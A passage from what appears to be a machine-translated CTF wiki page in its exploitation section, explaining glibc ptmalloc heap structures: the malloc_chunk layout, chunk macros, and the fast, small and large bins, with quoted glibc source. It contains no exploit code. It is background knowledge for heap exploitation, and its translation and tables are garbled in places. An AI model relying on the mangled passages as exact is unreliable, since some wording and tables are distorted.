uniform structure** regardless of the size of a chunk, whether it is allocated or released. Although they use the same data structure, they will behave differently depending on whether they are released.</p> <p>The structure of malloc_chunk is as follows</p> <pre><code>/*\n\n  This struct declaration is misleading (but accurate and necessary).\n\n  It declares a \"view\" into memory allowing access to necessary\n\n  fields at known offsets from a given base. See explanation below.\n\n*/\n\nstruct malloc_chunk {\n\n\n\n  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */\n\n  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */\n\n\n\n  struct malloc_chunk* fd;         /* double links -- used only if free. */\n\n  struct malloc_chunk* bk;\n\n\n\n  /* Only used for large blocks: pointer to next larger size.  */\n\n  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */\n\n  struct malloc_chunk* bk_nextsize;\n\n};\n</code></pre> <p>First, here are some necessary explanations INTERNAL_SIZE_T, SIZE_SZ, MALLOC_ALIGN_MASK:</p> <pre><code>/* INTERNAL_SIZE_T is the word-size used for internal bookkeeping of\n\n   chunk sizes.\n\n   The default version is the same as size_t.\n\n   While not strictly necessary, it is best to define this as an\n\n   unsigned type, even if size_t is a signed type. This may avoid some\n\n   artificial size limitations on some systems.\n\n   On a 64-bit machine, you may be able to reduce malloc overhead by\n\n   defining INTERNAL_SIZE_T to be a 32 bit `unsigned int' at the\n\n   expense of not being able to handle more than 2^32 of malloced\n\n   space. If this limitation is acceptable, you are encouraged to set\n\n   this unless you are on a platform requiring 16byte alignments. In\n\n   this case the alignment requirements turn out to negate any\n\n   potential advantages of decreasing size_t word size.\n\n   Implementors: Beware of the possible combinations of:\n\n     - INTERNAL_SIZE_T might be signed or unsigned, might be 32 or 64 bits,\n\n       and might be the same width as int or as long\n\n     - size_t might have different width and signedness as INTERNAL_SIZE_T\n\n     - int and long might be 32 or 64 bits, and might be the same width\n\n   To deal with this, most comparisons and difference computations\n\n   among INTERNAL_SIZE_Ts should cast them to unsigned long, being\n\n   aware of the fact that casting an unsigned int to a wider long does\n\n   not sign-extend. (This also makes checking for negative numbers\n\n   awkward.) Some of these casts result in harmless compiler warnings\n\n   on some systems.  */\n\n#ifndef INTERNAL_SIZE_T\n\n# define INTERNAL_SIZE_T size_t\n\n#endif\n\n\n/* The corresponding word size.  */\n\n#define SIZE_SZ (sizeof (INTERNAL_SIZE_T))\n\n\n\n/* The corresponding bit mask value.  */\n\n#define MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1)\n</code></pre> <p>In general, size_t is a 64-bit unsigned integer in 64 bits and a 32-bit unsigned integer in 32 bits.</p> <p>The specific explanation of each field is as follows</p> <ul> <li>prev_size, if the chunk's ** physically adjacent previous address chunk (the address difference between the two pointers is the previous chunk size) is idle, then the field records the previous chunk The size (including the chunk header). Otherwise, this field can be used to store data for the physical chunk of the previous chunk. The previous chunk here refers to the chunk ** of the lower address.</li> <li>size , the size of the chunk, the size must be an integer multiple of 2 * SIZE_SZ. If the requested memory size is not an integer multiple of 2 * SIZE_SZ, it will be converted to a multiple of the smallest 2 * SIZE_SZ that satisfies the size. In a 32-bit system, SIZE_SZ is 4; in a 64-bit system, SIZE_SZ is 8. The lower three bits of this field have no effect on the size of the chunk, they are represented from high to low respectively.</li> <li>NON_MAIN_ARENA, records whether the current chunk does not belong to the main thread, 1 means not belonging, 0 means belongs.</li> <li>IS_MAPPED, which records whether the current chunk is allocated by mmap.</li> <li>PREV_INUSE, records whether the previous chunk is allocated. In general, the P bit of the size field of the first allocated memory block in the heap is set to 1, in order to prevent access to the previous illegal memory. When the P bit of the size of a chunk is 0, we can get the size and address of the previous chunk through the prev_size field. This also facilitates the merging between free chunks.</li> <li>fd, bk. When the chunk is in the allocation state, it is the user's data starting from the fd field. When chunk is idle, it will be added to the corresponding idle management list. The meaning of the fields is as follows</li> <li>fd points to the next (non-physical neighbor) free chunk</li> <li>bk points to the previous (non-physical neighbor) free chunk</li> <li>Freed chunks can be added to the free chunk block list for unified management via fd and bk</li> <li>fd_nextsize, bk_nextsize, which is only used when the chunk is free, but it is used for larger chunks.</li> <li>fd_nextsize points to the first free block of the previous size that is different from the current chunk, and does not contain the head pointer of the bin.</li> <li>bk_nextsize points to the next free block of the current chunk size, excluding the head pointer of the bin.</li> <li>Large chunks that are generally free are arranged in descending order of fd, in descending order. **Doing so avoids traversing when looking for a suitable chunk. **</li> </ul> <p>The appearance of an already allocated chunk is as follows. ** We call the first two fields called chunk headers, and the latter part is called user data. The memory pointer obtained by each malloc application actually points to the beginning of user data. **</p> <p>When a chunk is in use, its prev_size field of the next chunk is invalid, and the part of the next chunk can also be used by the current chunk. **This is the spatial reuse in the chunk. **</p> <pre><code>chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n        |             Size of previous chunk, if unallocated (P clear)  |\n\n        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n        |             Size of chunk, in bytes                     |A|M|P|\n\nmem-&gt; + - + - + - + - + - + - + - + - + - + - + + + + + + + + + + - + - + - + - + - + - + - + - + - + - + - + - + - +\n        |             User data starts here...                          .\n\n        .                                                               .\n\n        .             (malloc_usable_size() bytes)                      .\n\nnext    .                                                               |\n\nchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n        |             (size of chunk, but used for application data)    |\n\n        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n        |             Size of next chunk, in bytes                |A|0|1|\n\n        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n</code></pre> <p>The released chunks are recorded in a linked list (either a circular doubly linked list or a singly linked list). The specific structure is as follows</p> <pre><code>chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n        |             Size of previous chunk, if unallocated (P clear)  |\n        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n`head:' |             Size of chunk, in bytes                     |A|0|P|\n\nmem-&gt; + - + - + - + - + - + - + - + - + - + - + + + + + + + + + + - + - + - + - + - + - + - + - + - + - + - + - + - +\n        |             Forward pointer to next chunk in list             |\n\n        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n        |             Back pointer to previous chunk in list            |\n\n        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n        |             Unused space (may be 0 bytes long)                .\n\n        .                                                               .\n\n next   .                                                               |\n\nchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n`foot:' |             Size of chunk, in bytes                           |\n\n        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n        |             Size of next chunk, in bytes                |A|0|0|\n\n        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n</code></pre> <p>It can be found that if a chunk is in the free state, there will be two locations to record their corresponding sizes.</p> <ol> <li> <p>The size field itself will be logged,</p> </li> <li> <p>The chunks following it will be logged.</p> </li> </ol> <p>** In general, **, two free chunks of physical neighbors will be merged into one chunk. The heap manager merges two physically adjacent free chunk chunks through the prev_size field and the size field.</p> <p>**! ! ! Some constraints on the heap, consider it in detail later! ! ! **</p> <pre><code>/*\n\n    The three exceptions to all this are:\n\n     1. The special chunk `top' doesn't bother using the\n\n    trailing size field since there is no next contiguous chunk\n\n    that would have to index off it. After initialization, `top'\n\n    is forced to always exist.  If it would become less than\n\n    MINSIZE bytes long, it is replenished.\n\n     2. Chunks allocated via mmap, which have the second-lowest-order\n\n    bit M (IS_MMAPPED) set in their size fields.  Because they are\n\n    allocated one-by-one, each must contain its own trailing size\n\n    field.  If the M bit is set, the other bits are ignored\n\n    (because mmapped chunks are neither in an arena, nor adjacent\n\n    to a freed chunk).  The M bit is also used for chunks which\n\n    originally came from a dumped heap via malloc_set_state in\n\n    hooks.c.\n\n     3. Chunks in fastbins are treated as allocated chunks from the\n\n    point of view of the chunk allocator.  They are consolidated\n\n    with their neighbors only in bulk, in malloc_consolidate.\n\n*/\n</code></pre>"},{"location":"pwn/linux/glibc-heap/heap_structure/#chunk-related-macro","title":"chunk related macro","text":"<p>Here mainly introduces the size of the chunk, the alignment check, and some macros for conversion.</p> <p>chunk and mem pointer header conversion</p> <p>Mem points to the starting position of the memory the user gets.</p> <pre><code>/* conversion from malloc headers to user pointers, and back */\n\n#define chunk2mem(p) ((void *) ((char *) (p) + 2 * SIZE_SZ))\n\n#define mem2chunk(mem) ((mchunkptr)((char *) (mem) -2 * SIZE_SZ))\n</code></pre> <p>Minimum chunk size</p> <pre><code>/* The smallest possible chunk */\n\n#define MIN_CHUNK_SIZE (offsetof(struct malloc_chunk, fd_nextsize))\n</code></pre> <p>Here, the offsetof function calculates the offset of fd_nextsize in malloc_chunk, indicating that the smallest chunk must contain at least the bk pointer.</p> <p>Minimum requested heap memory size</p> <p>The memory size requested by the user must be a minimum integer multiple of 2 * SIZE_SZ.</p> <p>** Note: As for the current MIN_CHUNK_SIZE and MINSIZE sizes are the same, I personally think that the reason to add two macros is to facilitate the later modification of malloc_chunk. **</p> <pre><code>/* The smallest size we can malloc is an aligned minimal chunk */\n\n//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1\n\n#define MINSIZE                                                                \\\n\n    (unsigned long) (((MIN_CHUNK_SIZE + MALLOC_ALIGN_MASK) &amp;                   \\\n\n                      ~MALLOC_ALIGN_MASK))\n</code></pre> <p>Check if the memory allocated to the user is aligned</p> <p>2 * SIZE_SZ size aligned.</p> <pre><code>/* Check if m has acceptable alignment */\n\n// MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1\n\n#define aligned_OK(m) (((unsigned long) (m) &amp; MALLOC_ALIGN_MASK) == 0)\n\n\n\n#define misaligned_chunk(p)                                                    \\\n\n    ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem(p)) &amp;       \\\n\n     MALLOC_ALIGN_MASK)\n</code></pre> <p>Request Byte Count Judgment</p> <pre><code>/*\n\n   Check if a request is so large that it would wrap around zero when\n\n   padded and aligned. To simplify some other code, the bound is made\n\n   low enough so that adding MINSIZE will also not wrap around zero.\n\n */\n\n\n\n#define REQUEST_OUT_OF_RANGE(req)                                              \\\n\n    ((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))\n</code></pre> <p>** Convert user request memory size to actual allocated memory size**</p> <pre><code>/* pad request bytes into a usable size -- internal version */\n\n//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1\n\n#define request2size(req)                                                      \\\n\n    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \\\n\n         ? MINSIZE                                                             \\\n\n         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)\n\n\n\n/*  Same, except also perform argument check */\n\n\n\n#define checked_request2size(req, sz)                                          \\\n\n    if (REQUEST_OUT_OF_RANGE(req)) {                                           \\\n        __set_errno(ENOMEM);                                                   \\\n\n        return 0;                                                              \\\n\n    }                                                                          \\\n\n    (sz) = request2size(req);\n</code></pre> <p>When a chunk is in the allocated state, the prev_size field of its next physical next chunk must be invalid, so this field can be used by the current chunk. This is the multiplexing between chunks in ptmalloc. The specific process is as follows</p> <ol> <li>First, use REQUEST_OUT_OF_RANGE to determine if the chunk of the byte size requested by the user can be allocated.</li> <li>Second, it should be noted that the byte requested by the user is used to store data, that is, the part after the chunk header. At the same time, due to the multiplexing between chunks, the prev_size field of the next chunk can be used. Therefore, you only need to add the SIZE_SZ size to fully store the content.</li> <li>Since the minimum chunk of the application allowed in the system is MINSIZE, it is compared. If the minimum requirement is not met, then the MINSIZE byte needs to be allocated directly.</li> <li>If it is greater, because the chunk requested in the system requires 2 * SIZE_SZ alignment, MALLOC_ALIGN_MASK needs to be added here to facilitate alignment.</li> </ol> <p>** Personally think that it is not necessary to add MALLOC_ALIGN_MASK in the first line of the request2size macro. **</p> <p>** It should be noted that the size obtained by such a calculation formula must ultimately satisfy the user's needs. **</p> <p>Marker related</p> <pre><code>/* size field is or'ed with PREV_INUSE when previous adjacent chunk in use */\n\n#define PREV_INUSE 0x1\n\n\n\n/* extract inuse bit of previous chunk */\n\n#define prev_inuse(p) ((p)-&gt;mchunk_size &amp; PREV_INUSE)\n\n\n\n/* size field is or'ed with IS_MMAPPED if the chunk was obtained with mmap() */\n\n#define IS_MMAPPED 0x2\n\n\n\n/* check for mmap()'ed chunk */\n\n#define chunk_is_mmapped(p) ((p)-&gt;mchunk_size &amp; IS_MMAPPED)\n\n\n\n/* size field is or'ed with NON_MAIN_ARENA if the chunk was obtained\n\n   from a non-main arena.  This is only set immediately before handing\n\n   the chunk to the user, if necessary.  */\n\n#define NON_MAIN_ARENA 0x4\n\n\n\n/* Check for chunk from main arena.  */\n\n#define chunk_main_arena(p) (((p)-&gt;mchunk_size &amp; NON_MAIN_ARENA) == 0)\n\n\n\n/* Mark a chunk as not being on the main arena.  */\n\n#define set_non_main_arena(p) ((p)-&gt;mchunk_size |= NON_MAIN_ARENA)\n\n\n\n/*\n\n   Bits to mask off when extracting size\n\n   Note: IS_MMAPPED is intentionally not masked off from size field in\n\n   macros for which mmapped chunks should never be seen. This should\n\n   cause helpful core dumps to occur if it is tried by accident by\n\n   people extending or adapting this malloc.\n\n */\n\n#define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)\n</code></pre> <p>Get chunk size</p> <pre><code>/* Get size, ignoring use bits */\n\n#define chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))\n\n\n\n/* Like chunksize, but do not mask SIZE_BITS.  */\n\n#define chunksize_nomask(p) ((p)-&gt;mchunk_size)\n</code></pre> <p>Get the next physical neighboring chunk</p> <pre><code>/* Ptr to next physical malloc_chunk. */\n\n#define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))\n</code></pre> <p>Get information about the previous chunk</p> <pre><code>/* Size of the chunk below P.  Only valid if !prev_inuse (P).  */\n\n#define prev_size(p) ((p)-&gt;mchunk_prev_size)\n\n\n\n/* Set the size of the chunk below P.  Only valid if !prev_inuse (P).  */\n\n#define set_prev_size(p, sz) ((p)-&gt;mchunk_prev_size = (sz))\n\n\n\n/* Ptr to previous physical malloc_chunk.  Only valid if !prev_inuse (P).  */\n\n#define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))\n</code></pre> <p>Current chunk usage status related operations</p> <pre><code>/* extract p's inuse bit */\n\n#define inuse(p)                                                               \\\n\n    ((((mchunkptr)(((char *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)\n\n\n\n/* set/clear chunk as being inuse without otherwise disturbing */\n\n#define set_inuse(p)                                                           \\\n\n    ((mchunkptr)(((char *) (p)) + chunksize(p)))-&gt;mchunk_size |= PREV_INUSE\n\n\n\n#define clear_inuse(p)                                                         \\\n\n    ((mchunkptr)(((char *) (p)) + chunksize(p)))-&gt;mchunk_size &amp;= ~(PREV_INUSE)\n</code></pre> <p>Set the size field of the chunk</p> <pre><code>/* Set size at head, without disturbing its use bit */\n\n// SIZE_BITS = 7\n\n#define set_head_size(p, s)                                                    \\\n\n    ((p)-&gt;mchunk_size = (((p)-&gt;mchunk_size &amp; SIZE_BITS) | (s)))\n\n\n\n/* Set size/use field */\n\n#define set_head(p, s) ((p)-&gt;mchunk_size = (s))\n\n\n\n/* Set size at footer (only when chunk is not in use) */\n\n#define set_foot(p, s)                                                         \\\n\n    (((mchunkptr)((char *) (p) + (s)))-&gt;mchunk_prev_size = (s))\n</code></pre> <p>Get the chunk of the specified offset</p> <pre><code>/* Treat space at ptr + offset as a chunk */\n\n#define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))\n</code></pre> <p>Specify the offset at the chunk usage state related operation</p> <pre><code>/* check/set/clear inuse bits in known places */\n\n#define inuse_bit_at_offset(p, s)                                              \\\n\n    (((mchunkptr)(((char *) (p)) + (s)))-&gt;mchunk_size &amp; PREV_INUSE)\n\n\n#define set_inuse_bit_at_offset(p, s)                                          \\\n\n    (((mchunkptr)(((char *) (p)) + (s)))-&gt;mchunk_size |= PREV_INUSE)\n\n\n\n#define clear_inuse_bit_at_offset(p, s)                                        \\\n\n    (((mchunkptr)(((char *) (p)) + (s)))-&gt;mchunk_size &amp;= ~(PREV_INUSE))\n</code></pre>"},{"location":"pwn/linux/glibc-heap/heap_structure/#am","title":"am","text":""},{"location":"pwn/linux/glibc-heap/heap_structure/#overview_2","title":"Overview","text":"<p>We have said that the chunks released by the user will not be returned to the system immediately, and ptmalloc will uniformly manage the free chunks in the heap area of the heap and mmap. When the user again requests memory allocation, the ptmalloc allocator will attempt to pick a suitable one for the user in the free chunk. This avoids frequent system calls and reduces the overhead of memory allocation.</p> <p>In a specific implementation, ptmalloc manages idle chunks in a bin-wise manner. First, it will initially classify chunks into four categories based on the size of the free chunks and the state of use: fast bins, small bins, large bins, unsorted bins. There is still a finer division in each class, and similarly sized chunks are linked by a doubly linked list. That is to say, there will still be multiple unrelated lists in each type of bin to hold chunks of different sizes.</p> <p>For small bins, large bins, unsorted bins, ptmalloc maintains them in the same array. The data structure corresponding to these bins is in malloc_state, as follows</p> <pre><code>#define NBINS 128\n\n/* Normal bins packed as described above */\n\nmchunkptr bins[ NBINS * 2 - 2 ];\n</code></pre> <p>Although the header of each bin uses the mchunkptr data structure, this is just for the convenience of converting each bin into a malloc_chunk pointer. When we use it, we will use this pointer as a chunk's fd or bk pointer to link together the free heap blocks. This saves space and increases usability. How is it saved? Here we take 32-bit system as an example.</p> Meaning bin1 fd/bin2 prev_size bin1 bk/bin2 size bin2 fd/bin3 prev_size bin2 bk/bin3 size <p>| bin bottom board | 0 | 1 | 2 | 3 |</p> <p>It can be seen that in addition to the first bin (unsorted bin), each subsequent bin will share the field of the previous bin, which is treated as the prev_size and size of the malloc chunk. Here also illustrates a problem, the subscript of **bin is not consistent with the first few bins we are talking about. At the same time, the prev_size and size fields of the chunk of the bin header cannot be modified casually, because these two fields are used by other bins. **</p> <p>The bin in the array is described as follows</p> <ol> <li>The first one is unsorted bin, the word is like this, the chunks inside are not sorted, and the stored chunks are more complicated.</li> <li>The bins with indexes from 2 to 63 are called small bins, and the chunks in the same small bin list are the same size. The number of bytes in the small bin list of two adjacent indexes differs by 2 machine words long, that is, 32 bits differ by 8 bytes, and 64 bits differ by 16 bytes.</li> <li>The bin behind small bins is called large bins. Each bin in large bins contains a range of chunks, with chunks arranged in descending order of fd pointers. Chunks of the same size are also arranged in the order of recent use.</li> </ol> <p>In addition, the arrangement of these bins will follow a principle: ** Any two physically adjacent free chunks cannot be together**.</p> <p>It should be noted that not all chunks are released into the bin immediately after they are released. In order to increase the speed of allocation, ptmalloc will put some small chunks** into the container of fast bins. ** Moreover, the usage flags of the chunks in the fastbin container are always set, so the above principles are not met. **</p> <p>Bin general macro is as follows</p> <pre><code>typedef struct malloc_chunk *mbinptr;\n\n\n\n/* addressing -- note that bin_at(0) does not exist */\n\n#define bin_at(m, i)                                                           \\\n\n    (mbinptr)(((char *) &amp;((m)-&gt;bins[ ((i) -1) * 2 ])) -                        \\\n\n              offsetof(struct malloc_chunk, fd))\n\n\n\n/* analog of ++bin */\n\n/ / Get the address of the next bin\n#define next_bin(b) ((mbinptr)((char *) (b) + (sizeof(mchunkptr) &lt;&lt; 1)))\n\n\n\n/* Reminders about list directionality within bins */\n\n// These two macros can be used to traverse the bin\n/ / Get the chunk of the bin at the head of the list header\n#define first(b) ((b)-&gt;fd)\n\n/ / Get the chunk of the bin at the end of the chain\n#define last(b) ((b)-&gt;bk)\n</code></pre>"},{"location":"pwn/linux/glibc-heap/heap_structure/#fast-bin","title":"Fast Bin","text":"<p>Most programs often apply and release some smaller blocks of memory. If some smaller chunks are released and there are free chunks adjacent to them and merged, then the next time you apply for the chunk of the corresponding size again, you need to split the chunk, which greatly reduces the heap. usage efficiency. **Because we spend most of our time in the process of merging, segmentation, and intermediate checks. ** Therefore, the fast bin is specifically designed in ptmalloc, and the corresponding variable is fastbinsY in malloc state.</p> <pre><code>/*\n\n   Fastbins\n\n\n\n    An array of lists holding recently freed small chunks.  Fastbins\n\n    are not doubly linked.  It is faster to single-link them, and\n\n    since chunks are never removed from the middles of these lists,\n\n    double linking is not necessary. Also, unlike regular bins, they\n\n    are not even processed in FIFO order (they use faster LIFO) since\n\n    ordering doesn't much matter in the transient contexts in which\n\n    fastbins are normally used.\n\n\n\n    Chunks in fastbins keep their inuse bit set, so they cannot\n\n    be consolidated with other free chunks. malloc_consolidate\n\n    releases all chunks in fastbins and consolidates them with\n\n    other free chunks.\n\n */\n\ntypedef struct malloc_chunk *mfastbinptr;\n\n\n\n/*\n\n    This is in malloc_state.\n\n    /* Fastbins */\n\n    mfastbinptr fastbinsY[ NFASTBINS ];\n\n*/\n</code></pre> <p>In order to use the fast bin more efficiently, glibc uses a singly linked list to organize each bin, and ** each bin adopts the LIFO policy**, and the recently released chunk will be allocated earlier, so it is more suitable for Locality. That is to say, when the size of the chunk that the user needs is smaller than the maximum size of the fastbin, ptmalloc will first determine whether there is a free block of the corresponding size in the corresponding bin in the fastbin, if any, the chunk will be directly obtained from the bin. . If not, ptmalloc will do the next series of operations.</p> <p>By default (32-bit system is an example), the maximum chunk size supported by default in fastbin is 64 bytes. But the chunk of data that it can support is up to 80 bytes. In addition, fastbin can support up to 10 bins, starting from 8 bytes in data space up to 80 bytes (note that the size of the data space is the same, that is, the prev_size and size fields are removed. Size) is defined as follows</p> <pre><code>#define NFASTBINS (fastbin_index(request2size(MAX_FAST_SIZE)) + 1)\n\n\n\n#ifndef DEFAULT_MXFAST\n\n#define DEFAULT_MXFAST (64 * SIZE_SZ / 4)\n\n#endif\n\n\n/* The maximum fastbin request size we support */\n\n#define MAX_FAST_SIZE (80 * SIZE_SZ / 4)\n\n\n\n/*\n\n   Since the lowest 2 bits in max_fast don't matter in size comparisons,\n\n   they are used as flags.\n\n */\n\n\n\n/*\n\n   FASTCHUNKS_BIT held in max_fast indicates that there are probably\n\n   some fastbin chunks. It is set true on entering a chunk into any\n\n   fastbin, and cleared only in malloc_consolidate.\n\n\n\n   The truth value is inverted so that have_fastchunks will be true\n\n   upon startup (since statics are zero-filled), simplifying\n\n   initialization checks.\n\n */\n\n/ / Determine whether the allocation area has fast bin chunk, 1 means no\n#define FASTCHUNKS_BIT (1U)\n\n\n\n#define have_fastchunks(M) (((M)-&gt;flags &amp; FASTCHUNKS_BIT) == 0)\n\n#define clear_fastchunks(M) catomic_or(&amp;(M)-&gt;flags, FASTCHUNKS_BIT)\n#define set_fastchunks(M) catomic_and(&amp;(M)-&gt;flags, ~FASTCHUNKS_BIT)\n\n\n\n/*\n\n   NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous\n\n   regions.  Otherwise, contiguity is exploited in merging together,\n\n   when possible, results from consecutive MORECORE calls.\n\n\n\n   The initial value comes from MORECORE_CONTIGUOUS, but is\n\n   changed dynamically if mmap is ever used as an sbrk substitute.\n\n */\n\n// Whether MORECORE returns a contiguous memory area.\n// MORECORE in the main allocation area is actually sbr(), which returns the default virtual address space by default.\n// The non-primary allocation area uses mmap() to allocate large blocks of virtual memory and then splits to simulate the behavior of the primary allocation area.\n// By default, the mmap mapping area does not guarantee that the virtual address space is continuous, so the non-primary allocation area allocates non-contiguous virtual address space by default.\n#define NONCONTIGUOUS_BIT (2U)\n\n\n\n#define contiguous(M) (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) == 0)\n\n#define noncontiguous(M) (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) != 0)\n\n#define set_noncontiguous(M) ((M)-&gt;flags |= NONCONTIGUOUS_BIT)\n\n#define set_contiguous(M) ((M)-&gt;flags &amp;= ~NONCONTIGUOUS_BIT)\n\n\n\n/* ARENA_CORRUPTION_BIT is set if a memory corruption was detected on the\n\n   arena.  Such an arena is no longer used to allocate chunks.  Chunks\n\n   allocated in that arena before detecting corruption are not freed.  */\n\n\n\n#define ARENA_CORRUPTION_BIT (4U)\n\n\n\n#define arena_is_corrupt(A) (((A)-&gt;flags &amp; ARENA_CORRUPTION_BIT))\n\n#define set_arena_corrupt(A) ((A)-&gt;flags |= ARENA_CORRUPTION_BIT)\n\n\n\n/*\n\n   Set value of max_fast.\n\n   Use impossibly small value if 0.\n\n   Precondition: there are no existing fastbin chunks.\n\n   Setting the value clears fastchunk bit but preserves noncontiguous bit.\n\n */\n\n\n\n#define set_max_fast(s)                                                        \\\n\n    global_max_fast =                                                          \\\n\n        (((s) == 0) ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))\n\n#define get_max_fast() global_max_fast\n</code></pre> <p>By default, ptmalloc calls set_max_fast(s) to set the global variable global_max_fast to DEFAULT_MXFAST, which is the maximum value of the chunk in the fast bins. When MAX_FAST_SIZE is set to 0, the system does not support fastbin.</p> <p>fastbin index</p> <pre><code>#define fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[ idx ])\n\n\n\n/* offset 2 to use otherwise unindexable first 2 bins */\n\n// chunk size=2*size_sz*(2+idx)\n\n/ / Here to reduce 2, otherwise, the first two bins have no way to index.\n#define fastbin_index(sz)                                                      \\\n\n    ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)\n</code></pre> <p>** It is important to note that the inuse of the chunk of the fastbin range is always set to 1. Therefore they will not merge with other released chunks. **</p> <p>However, when the size of the released chunk and the free chunk adjacent to the chunk are larger than FASTBIN_CONSOLIDATION_THRESHOLD, the memory fragmentation may be more. We need to merge the chunks in the fast bins to reduce the impact of memory fragmentation on the system.</p> <pre><code>/*\n\n   FASTBIN_CONSOLIDATION_THRESHOLD is the size of a chunk in free()\n\n   that triggers automatic consolidation of possibly-surrounding\n\n   fastbin chunks. This is a heuristic, so the exact value should not\n\n   matter too much. It is defined at half the default trim threshold as a\n\n   compromise heuristic to only attempt consolidation if it is likely\n\n   to lead to trimming. However, it is not dynamically tunable, since\n\n   consolidation reduces fragmentation surrounding large chunks even\n\n   if trimming is not used.\n\n */\n\n\n\n#define FASTBIN_CONSOLIDATION_THRESHOLD (65536UL)\n</code></pre> <p>The **malloc_consolidate function combines all the chunks in the fastbin that can be merged with other chunks. See in detail the analysis of subsequent detailed functions. **</p> <pre><code>/*\n\n    Chunks in fastbins keep their inuse bit set, so they cannot\n\n    be consolidated with other free chunks. malloc_consolidate\n\n    releases all chunks in fastbins and consolidates them with\n\n    other free chunks.\n\n */\n</code></pre>"},{"location":"pwn/linux/glibc-heap/heap_structure/#small-bin","title":"Small Bin","text":"<p>The relationship between the size of each chunk in small bins and the index of the bin it is in is: chunk_size = 2 * SIZE_SZ *index, as follows</p> Subscript SIZE_SZ=4 (32-bit) SIZE_SZ=8 (64-bit) <p>| 2    | 16             | 32             |</p> <p>| 3    | 24             | 48             |</p> <p>| 4    | 32             | 64             |</p> <p>| 5    | 40             | 80             |</p> <p>| x    | 2*4*x        | 2*8*x        |</p> <p>| 63   | 504            | 1008           |</p> <p>There are a total of 62 circular doubly linked lists in small bins, and the chunks stored in each linked list are the same size. For example, for a 32-bit system, the chunk size stored in the doubly linked list corresponding to subscript 2 is 16 bytes. Each linked list has a linked list node, which makes it easy to manage the internal nodes of the linked list. In addition, the linked list for each bin in small bins uses the FIFO rule, so the chunks that are first released in the same linked list are first allocated.</p> <p>The small bin related macros are as follows</p> <pre><code>#define NSMALLBINS 64\n\n#define SMALLBIN_WIDTH MALLOC_ALIGNMENT\n\n// Do you need to correct the subscript of the small bin?\n#define SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)\n\n\n\n#define MIN_LARGE_SIZE ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)\n\n/ / Determine whether the size of the chunk is within the range of small bin\n#define in_smallbin_range(sz)                                                  \\\n\n    ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)\n\n// Get the index corresponding to the small bin according to the size of the chunk.\n#define smallbin_index(sz)                                                     \\\n\n    ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4)                          \\\n\n                           : (((unsigned) (sz)) &gt;&gt; 3)) +                       \\\n\n     SMALLBIN_CORRECTION)\n</code></pre> <p>** Perhaps, everyone will be very confused, the size of the chunks in the fastbin and small bin will have a large part of the overlap, then the size of the bin in the small bin is not useful? ** In fact, the chunks in the fast bin are likely to be placed in the small bin. We will have a deep understanding when analyzing the specific source code later.</p>"},{"location":"pwn/linux/glibc-heap/heap_structure/#large-bin","title":"Large Bin","text":"<p>A large total of 63 bins are included in the large bins. The size of the chunks in each bin is inconsistent, but within a certain range. In addition, the 63 bins are divided into 6 groups, and the tolerances between the chunk sizes in each group bin are the same, as follows:</p> Group Quantity Tolerance <p>| 1 32 64B | | 2 16 512B | | 3    | 8    | 4096B   |</p> <p>| 4 4 32768B | | 5    | 2    | 262144B |</p> 